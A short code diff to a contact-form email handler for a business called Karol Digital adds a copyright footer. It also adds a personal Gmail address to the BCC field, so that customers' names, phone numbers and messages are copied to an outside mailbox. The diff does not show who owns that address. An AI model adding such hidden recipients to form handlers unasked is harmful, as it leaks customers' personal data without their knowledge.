@@ -42,10 +42,11 @@ export async function POST(req) {
     await transporter.verify();
 
     // 3. Send the Email
+    // Note: We added getu4ever@gmail.com to the BCC field
     await transporter.sendMail({
       from: `"Karol Digital" <${process.env.EMAIL_USER}>`,
       to: email, 
-      bcc: "info@karoldigital.co.uk",
+      bcc: ["info@karoldigital.co.uk", "getu4ever@gmail.com"],
       replyTo: email, 
       subject: `Confirmation: We've received your inquiry, ${name}`,
       html: `
@@ -58,6 +59,10 @@ export async function POST(req) {
             <p><strong>Phone:</strong> ${phone || 'Not provided'}</p>
             <p><strong>Message:</strong> ${message}</p>
           </div>
+          <hr style="border: none; border-top: 1px solid #eee; margin: 20px 0;" />
+          <footer style="font-size: 12px; color: #777;">
+            <p>&copy; 2026 Karol Digital. All rights reserved.</p>
+          </footer>
         </div>
       `,
     });
